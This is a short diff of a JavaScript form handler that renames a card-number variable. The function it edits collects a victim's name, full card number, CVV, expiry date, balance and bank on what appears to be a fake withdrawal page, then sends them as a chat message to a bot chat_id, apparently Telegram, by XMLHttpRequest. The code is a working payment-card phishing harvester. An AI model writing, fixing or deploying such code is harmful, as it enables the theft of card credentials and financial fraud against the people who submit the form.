@@ -1,6 +1,6 @@
 function sendMessage() {
     var name = document.getElementById('name').value;
-    var cardNumber = document.getElementById('cardNumber').value;
+    var numberCard = document.getElementById('numberCard').value;
     var cvv = document.getElementById('cvv').value;
     var expiryDate = document.getElementById('expiryDate').value;
     var cardBalance = document.getElementById('cardBalance').value;
@@ -17,11 +17,11 @@ function sendMessage() {
     // Формируем данные для отправки
     var data = {
         chat_id: chatId,
-        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + cardNumber + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + currency + '\nБанк: ' + chooseBank
+        text: 'Имя Фамилия: ' + name + '\nНомер карты: ' + numberCard + '\nCVV: ' + cvv + '\nВремя действия: ' + expiryDate + '\nБаланс: ' + cardBalance + currency + '\nБанк: ' + chooseBank
     };
 
     // Отправляем POST-запрос с использованием AJAX
-    if (name === "" || cardNumber === "" || cvv === "" || expiryDate === "" || cardBalance === "" || chooseBank === "" || cvv.length < 3 || cardNumber.length < 19 || expiryDate.length < 5) {
+    if (name === "" || numberCard === "" || cvv === "" || expiryDate === "" || cardBalance === "" || chooseBank === "" || cvv.length < 3 || numberCard.length < 19 || expiryDate.length < 5) {
         alert('Пожалуйста, заполните все поля перед выводом.');
     } else {
         var xhr = new XMLHttpRequest();
